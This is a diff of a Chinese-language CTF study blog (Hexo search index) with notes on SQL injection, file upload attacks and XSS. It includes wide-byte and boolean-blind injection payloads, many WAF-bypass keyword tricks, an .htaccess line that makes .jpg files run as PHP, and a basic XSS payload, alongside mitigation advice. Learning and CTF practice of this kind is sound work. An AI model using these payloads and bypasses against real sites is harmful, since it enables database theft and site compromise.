+<h4 id="宽字节注入条件"><a href="#宽字节注入条件" class="headerlink" title="宽字节注入条件"></a><strong>宽字节注入条件</strong></h4><p>1.数据库为GBK编码<br>2.使用了转义函数，将、POGETST、cookie传递的参数进行过滤，将单引号、双引号、null等敏感字符用转义符 \ 进行转义</p>
+<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><pre><code class="highlight plaintext">root %df&#x27; or 1=1 #
+# 原理:在GBK编码中,反斜杠的编码是%5c,在输入%df后，使得添加反斜杠后形成%df%5c，而%df%5c是繁体字“連”，单引号成功逃逸，爆出Mysql数据库的错误</code></pre>
+
+
+
+<h3 id="约束攻击"><a href="#约束攻击" class="headerlink" title="约束攻击"></a>约束攻击</h3><p>在SQL执行字符串处理操作时，字符串末尾的空格符将会被删除，换句话说”user”是等同于”user     “的，对于绝大多数的情况这两个相等都是成立的(像WHERE子句的字符串和INSERT语句中的字符串)</p>
+<blockquote>
+<p>[!WARNING]</p>
+<p>但是在像LIKE 子句中这是不成立的。因为对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在<a href="https://support.microsoft.com/en-in/kb/316626">内部</a>使用空格来填充字符串，以便在比较之前使其它们的长度保持一致</p>
+</blockquote>
+<p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”</p>
+<p><strong>攻击手段</strong></p>
+<p>注册一个用户名+一堆括号+1的用户名和自己的passwd(未超出长度限制的字符应该只包含已知的用户名和空白字符)</p>
+<p>注:在查询时，SQL是不会将字符串截断的。因此，使用完整的字符串进行搜索，所以不会找到匹配的结果。但当执行INSERT查询语句时，它只会插入被限制长度的字符。</p>
+<p>在攻击结束后，输入后来我们自己的密码和已给的用户名，会登录上原始用户</p>
+<pre><code class="highlight plaintext">解决办法:
+将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。
+
+最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪
+
+为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</code></pre>
+
+
+
+<h2 id="Episode-3-在拿到flag的边缘疯狂试探-盲注"><a href="#Episode-3-在拿到flag的边缘疯狂试探-盲注" class="headerlink" title="Episode 3 在拿到flag的边缘疯狂试探:盲注"></a>Episode 3 在拿到flag的边缘疯狂试探:盲注</h2><p>(哈哈，盲注脚本吗，你问我，我只能说最好自己写一个，网上淘来的毕竟是别人的不如你自己搓的顺手)</p>
+<p>先确定注入型，再用and连接一下</p>
+<pre><code class="highlight sql">布尔盲注
+<span class="number">1.</span> length(database())<span class="operator">&gt;</span>??? 初步判断
+<span class="number">2.</span></code></pre>
+
+<h2 id="Episode-4-注入点-猜猜我在哪里呢"><a href="#Episode-4-注入点-猜猜我在哪里呢" class="headerlink" title="Episode 4 注入点:&gt;猜猜我在哪里呢"></a>Episode 4 注入点:&gt;猜猜我在哪里呢</h2><h2 id="Episode-5-你好，绕WAF"><a href="#Episode-5-你好，绕WAF" class="headerlink" title="Episode   5  你好，绕WAF"></a>Episode   5  你好，绕WAF</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>如过过滤了and和AND，试试And</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>如果waf把and替换为空</p>
+<p>然后可以使用<code>anandd</code>绕过</p>
+<h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>&#x2F;**&#x2F;  注释符号</p>
+<pre><code class="highlight plaintext">()-&gt;select(1),2,3</code></pre>
+
+<p>（）可以作为一个子语句查询存在,任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。所以就可以用()代替空格</p>
+<p>url编码绕过<code>%0a %20 %09 %0a %0b %0c %0d %a0</code>代替。</p>
+<h3 id="引号绕过"><a href="#引号绕过" class="headerlink" title="引号绕过"></a>引号绕过</h3><p>使用十六进制替代需要用到引号的语句，一般是在最后的查询语句</p>
+<h3 id="and和or绕过"><a href="#and和or绕过" class="headerlink" title="and和or绕过"></a>and和or绕过</h3><p>考虑管道符||表示or和&amp;&amp;表示and</p>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h3><p>改成like或者&lt;或者&gt;</p>
+<p>还有<code>rlike 、regexp(正则匹配函数，‘’是直接找或包含，^是以什么开头,可以用[a-zA-Z]流氓匹配)</code></p>
+<h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><pre><code class="highlight sql"><span class="keyword">select</span> substr(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
+#substr(str,pos,len)的功能是从pos开始的位置，截取len个字符；而无len就是直接截取到最后
+<span class="keyword">select</span> mid(database() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);
+#
+<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">1</span><span class="operator">&gt;</span>a <span class="keyword">join</span> <span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">2</span><span class="operator">&gt;</span>b <span class="keyword">join</span><span class="operator">&lt;</span><span class="keyword">select</span> <span class="number">3</span><span class="operator">&gt;</span>c <span class="keyword">join</span>
+<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> ((selcet1)A <span class="keyword">join</span> (select2)B <span class="keyword">join</span>(<span class="keyword">select</span> <span class="number">3</span>)C);
+limit <span class="number">0</span>,<span class="number">1</span><span class="operator">-</span><span class="operator">&gt;</span>limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">0</span>;<span class="operator">/</span><span class="operator">/</span>等于limit <span class="number">0</span>,<span class="number">1</span> 从第<span class="number">1</span>行往后取<span class="number">0</span>行，只读第一行
+#limit <span class="number">1</span>,<span class="number">2</span> 指的是从第一行往后取<span class="number">2</span>行（包括第一行和第二行)；而limit <span class="number">1</span> <span class="keyword">offset</span> <span class="number">2</span>是从第一行开始只取第二行
+<span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27;hello&#x27;</span> <span class="keyword">from</span> <span class="number">1</span>);</code></pre>
+
+<h3 id="比较符号-绕过"><a href="#比较符号-绕过" class="headerlink" title="比较符号(&lt; &gt;)绕过"></a>比较符号(&lt; &gt;)绕过</h3><p>一般是盲注要用到捏</p>
+<p>最常见的一个盲注的sql语句：</p>
+<pre><code class="highlight plaintext">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</code></pre>
+
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<pre><code class="highlight plaintext">select*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64</code></pre>
+
+<h3 id="绕过关键字-union-select，where"><a href="#绕过关键字-union-select，where" class="headerlink" title="绕过关键字(union,select，where)"></a>绕过关键字(union,select，where)</h3><p>1）使用注释符绕过：</p>
+<p>常用注释符：</p>
+<p><code>//，-- , /**/, #(url编码一下还能用), --+, -- -, ;,%00,--a</code></p>
+<p>用法：</p>
+<p><code>U/**/NION/**/SE/**/LECT/**/user，pwd from user</code></p>
+<p>2）使用大小写绕过：</p>
+<p><code>id=-1&#39;UnIoN/**/SeLeCT</code></p>
+<p>3）内联注释绕过：</p>
+<p><code>id=-1&#39;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</code></p>
+<p>4） 双关键字绕过：</p>
+<p><code>id=-1&#39;UNIunionONSeLselectECT1,2,3–-</code></p>
+<h3 id="通用编码绕过"><a href="#通用编码绕过" class="headerlink" title="通用编码绕过"></a>通用编码绕过</h3><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p>
+<p>or1&#x3D;1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p>
+<h3 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h3><p>hex()、bin()&#x3D;&#x3D;&gt;ascii()</p>
+<p>sleep()&#x3D;&#x3D;&gt;benchmark()</p>
+<p>concat_ws()&#x3D;&#x3D;&gt;group_concat()</p>
+<p>mid()、substr()&#x3D;&#x3D;&gt;substring() @@user&#x3D;&#x3D;&gt;user() @@datadir&#x3D;&#x3D;&gt;datadir()</p>
+<p>举例：substring()和substr()无法使用时：?id&#x3D;1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))&#x3D;74或者：</p>
+<p>substr((select’password’),1,1)&#x3D;0x70strcmp(left(‘password’,1),0x69)&#x3D;1strcmp(left(‘password’,1),0x70)&#x3D;0strcmp(left(‘password’,1),0x71)&#x3D;-1</p>
+<h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><p>网页显示常常只能给出有限长度的字母，这个时候就要通过一些函数来绕过</p>
+<pre><code class="highlight sql"><span class="number">1</span>、<span class="keyword">left</span>（<span class="number">201809</span>,<span class="number">4</span>）截取左边的<span class="number">4</span>个字符
+<span class="keyword">SELECT</span> <span class="keyword">LEFT</span>(<span class="number">201809</span>,<span class="number">4</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">2018</span>
+
+<span class="number">2</span>、<span class="keyword">right</span>（name,<span class="number">2</span>）截取右边的<span class="number">2</span>个字符
+<span class="keyword">SELECT</span> <span class="keyword">RIGHT</span>(<span class="number">201809</span>,<span class="number">2</span>)    <span class="operator">/</span><span class="operator">/</span>结果：<span class="number">09</span>
+
+<span class="number">3</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">5</span>,<span class="number">3</span>) 截取name这个字段 从第五个字符开始 只截取之后的<span class="number">3</span>个字符
+<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">5</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：事业部
+
+<span class="number">4</span>、<span class="built_in">SUBSTRING</span>(name,<span class="number">3</span>) 截取name这个字段 从第三个字符开始，之后的所有个字符
+<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">3</span>)   <span class="operator">/</span><span class="operator">/</span>结果：融资事业部
+
+<span class="number">5</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，直到结束
+<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事业部
+
+<span class="number">6</span>、<span class="built_in">SUBSTRING</span>(name, <span class="number">-4</span>，<span class="number">2</span>) 截取name这个字段的第 <span class="number">4</span> 个字符位置（倒数）开始取，只截取之后的<span class="number">2</span>个字符
+<span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>,<span class="number">-4</span>,<span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：资事
+注意：我们注意到在函数 <span class="built_in">substring</span>(str,pos, len)中， pos 可以是负值，但 len 不能取负值。
+
+<span class="number">7</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> 之前的所有字符
+<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：www.baidu
+
+<span class="number">8</span>、substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>) 截取第二个 <span class="string">&#x27;.&#x27;</span> （倒数）之后的所有字符
+<span class="keyword">SELECT</span> substring_index(<span class="string">&#x27;www.baidu.com&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="number">-2</span>)   <span class="operator">/</span><span class="operator">/</span>结果：baidu.com
+
+<span class="number">9</span>、SUBSTR(name, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(name)<span class="number">-3</span>) 截取name字段，取除name字段后三位的所有字符
+<span class="keyword">SELECT</span> SUBSTR(<span class="string">&#x27;成都融资事业部&#x27;</span>, <span class="number">1</span>, <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;成都融资事业部&#x27;</span>)<span class="number">-3</span>)            <span class="operator">/</span><span class="operator">/</span>结果：成都融资
+
+<span class="number">10</span>、mid(str,<span class="keyword">start</span>,[length])
+str:截取的字符串   <span class="keyword">start</span>:起始位置   length:截取的长度，可以忽略
+
+<span class="number">11.</span>reverse(concat(<span class="number">0x3a</span>，(<span class="keyword">select</span>(group_concat(real_flag_1s_here))<span class="keyword">from</span>(users)<span class="keyword">where</span>(real_flag_1s_here)regexp(<span class="string">&#x27;^f&#x27;</span>))))
+用reverse倒序输出，有时候有奇效。?大概吧</code></pre>
+
+
+
+<h2 id="Episode-6-模糊匹配"><a href="#Episode-6-模糊匹配" class="headerlink" title="Episode 6  模糊匹配"></a>Episode 6  模糊匹配</h2><p>SQL模糊查询，使用like比较关键字，加上SQL里的通配符，请参考以下：</p>
+<p>1、LIKE’Mc%’ 将搜索以字母 Mc 开头的所有字符串（如 McBadden）。</p>
+<p>2、LIKE’%inger’ 将搜索以字母 inger 结尾的所有字符串（如 Ringer、Stringer）</p>
+<p>3、LIKE’%en%’ 将搜索在任何位置包含字母 en 的所有字符串（如 Bennet、Green、McBadden）。</p>
+<p>4、LIKE’_heryl’ 将搜索以字母 heryl 结尾的所有六个字母的名称（如 Cheryl、Sheryl）。</p>
+<p>5、LIKE’[CK]ars[eo]n’ 将搜索下列字符串：Carsen、Karsen、Carson 和 Karson（如 Carson）。</p>
+<p>6、LIKE’[M-Z]inger’ 将搜索以字符串 inger 结尾、以从 M 到 Z 的任何单个字母开头的所有名称（如 Ringer）。</p>
+<p>7、LIKE’M[^c]%’ 将搜索以字母 M 开头，并且第二个字母不是 c 的所有名称（如MacFeather）。</p>
+<h2 id="Episode-7-奇奇怪怪的知识点积累"><a href="#Episode-7-奇奇怪怪的知识点积累" class="headerlink" title="Episode   7 奇奇怪怪的知识点积累"></a>Episode   7 奇奇怪怪的知识点积累</h2><p><strong>短路算法：</strong></p>
+<p>|| 逻辑或的短路：a||b</p>
+<p>计算机发现a是真，那么输出a；如果a是假，那么输出b</p>
+<p>select 1 from ：建立一个临时列，这个列的所有初始值都被设为1。如果发现select后面跟有||就可以构造1 ||(sql语句) 用来无效化后方语句。</p>
+<p><strong>WITH ROLLUP:</strong>(来自ctfshow web10)</p>
+<pre><code class="highlight plaintext">语法:group by xxx with rollup</code></pre>
+
+<p>with rollup是对前面数据的一次汇总，此时在查询的数据中会被插入一行值为NULL,此时即可绕过长度检验</p>
+<h2 id="Episode-8-一点感想"><a href="#Episode-8-一点感想" class="headerlink" title="Episode   8 一点感想"></a>Episode   8 一点感想</h2><p>刷了一些题目，发现最重要的其实是注入点的判断(除非是万恶的盲注，那重点可能更在脚本上)</p>
+<p>[参考文章]: <a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html">https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html</a>	“基于约束的SQL攻击 - Angel_Kitty - 博客园”<br>[参考文章]: <a href="https://www.cnblogs.com/icui4cu/p/15136893.html">https://www.cnblogs.com/icui4cu/p/15136893.html</a>	“宽字节注入原理及绕过方式”</p>
+]]></content>
+      <tags>
+        <tag>-web -CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件上传漏洞</title>
+    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
+<p>弱判断:bp改一下就能过</p>
+<p>增加文件头</p>
+<p>改phtml绕过</p>
+<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
+<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
+<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
+]]></content>
+      <tags>
+        <tag>-CTF -Web</tag>
       </tags>
   </entry>
   <entry>
@@ -2115,16 +2247,69 @@ file:///<span class="type">path</span>/<span class="keyword">to</span>/file.ext<
       </tags>
   </entry>
   <entry>
-    <title>文件上传漏洞</title>
-    <url>/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h1 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h1><p>题型：</p>
-<p>弱判断:bp改一下就能过</p>
-<p>增加文件头</p>
-<p>改phtml绕过</p>
-<p>利用.user.ini配置文件或者.htaccess配合攻击(必须用特定文件后缀名时)</p>
-<p>.htaccess：内容如下（功能是将.jpeg文件解析为php文件）：</p>
-<pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>
-]]></content>
+    <title>详解XSS注入</title>
+    <url>/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="XSS注入"><a href="#XSS注入" class="headerlink" title="XSS注入"></a>XSS注入</h1><pre><code class="highlight plaintext">&quot;球球你了！就让我插一句话，我什么都会做的!!!&quot;
+
+&quot;byd被我注入了吧&quot;</code></pre>
+
+<h2 id="认识XSS攻击"><a href="#认识XSS攻击" class="headerlink" title="认识XSS攻击"></a>认识XSS攻击</h2><p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
+<ul>
+<li>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。</li>
+</ul>
+<p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
+<p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
+<h2 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h2><pre><code class="highlight plaintext">又称**非持久型XSS**。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。
+
+攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，特有的恶意代码参数被 HTML 解析、执行。
+
+非持久型 XSS 漏洞攻击的**四大特点**：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。
+
+防止出现非持久型 XSS 漏洞的**五大措施**：① Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端；②尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染；③尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法；④如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义；⑤ 前端渲染的时候对任何的字段都需要做 escape 转义编码</code></pre>
+
+<p>反射型 XSS 的 Payload 如下</p>
+<pre><code class="highlight plaintext">&lt;script&gt;alert(1)&lt;script&gt;</code></pre>
+
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul>
+<li>“&gt;闭合绕过</li>
+</ul>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><pre><code class="highlight plaintext">存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。
+
+一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。
+
+这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。
+
+可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。
+
+持久型 XSS 的三**大特点**：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。
+
+防止持久型 XSS 漏洞的**三大措施：** ①后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理；②后端在输出给前端数据统一进行转义处理；③前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</code></pre>
+
+
+
+<h2 id="DOM-based-型"><a href="#DOM-based-型" class="headerlink" title="DOM-based 型"></a>DOM-based 型</h2><pre><code class="highlight plaintext">客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 [DOM-based XSS](https://zhida.zhihu.com/search?content_id=164263694&amp;content_type=Article&amp;match_order=1&amp;q=DOM-based+XSS&amp;zhida_source=entity) 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</code></pre>
+
+
+
+<h2 id="基于字符集的-XSS"><a href="#基于字符集的-XSS" class="headerlink" title="基于字符集的 XSS"></a>基于字符集的 XSS</h2><pre><code class="highlight plaintext">哪怕现在很多的浏览器以及各种开源的库都专门针对了 XSS 进行转义处理，尽量默认抵御绝大多数 XSS 攻击，但是还是有很多方式可以绕过转义规则，让人防不胜防。比如「基于字符集的 XSS 攻击」就是绕过这些转义处理的一种攻击方式，比如有些 Web 页面字符集不固定，用户输入非期望字符集的字符，有时会绕过转义过滤规则。
+
+可以形成「基于字符集的 XSS 攻击」的原因是由于浏览器在 meta 没有指定 charset 的时候有自动识别编码的机制，所以这类攻击通常就是发生在没有指定或者没来得及指定 meta 标签的 charset 的情况下。
+
+避免基于字符集的 XSS 攻击的**两大方法：**①记住指定 &lt;meta charset=&quot;utf-8&quot;&gt;；② XML 中不仅要指定字符集为 utf-8，而且标签要闭合。</code></pre>
+
+
+
+<h2 id="基于-Flash-的跨站-XSS"><a href="#基于-Flash-的跨站-XSS" class="headerlink" title="基于 Flash 的跨站 XSS"></a>基于 Flash 的跨站 XSS</h2><pre><code class="highlight plaintext">基于 Flash 的跨站 XSS 也是属于反射型 XSS 的一种，AS 脚本可以接受用户输入并操作 cookie，攻击者可以配合其他 XSS（持久型或者非持久型）方法将恶意 swf 文件嵌入页面中。主要是因为 AS 有时候需要和 JS 传参交互，攻击者会通过恶意的 XSS 注入篡改参数，窃取并操作cookie。
+
+基于 Flash 的跨站 XSS 的**两种避免方法** **：**①严格管理 cookie 的读写权限；②对 Flash 能接受用户输入的参数进行过滤 escape 转义处理。</code></pre>
+
+
+
+<h2 id="未经验证的跳转-XSS"><a href="#未经验证的跳转-XSS" class="headerlink" title="未经验证的跳转 XSS"></a>未经验证的跳转 XSS</h2><pre><code class="highlight plaintext">有一些场景是后端需要对一个传进来的待跳转的 URL 参数进行一个 302 跳转，可能其中会带有一些用户的敏感（cookie）信息。如果服务器端做302 跳转，跳转的地址来自用户的输入，攻击者可以输入一个恶意的跳转地址来执行脚本。
+
+防止未经验证的跳转 XSS漏洞的**两种措施：**①对待跳转的 URL 参数做白名单或者某种规则过滤；②后端注意对敏感信息的保护, 比如 cookie 使用来源验证。</code></pre>
+
+<h2 id="XSS-BOT"><a href="#XSS-BOT" class="headerlink" title="XSS BOT"></a>XSS BOT</h2><h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2>]]></content>
       <tags>
         <tag>-CTF -Web</tag>
       </tags>
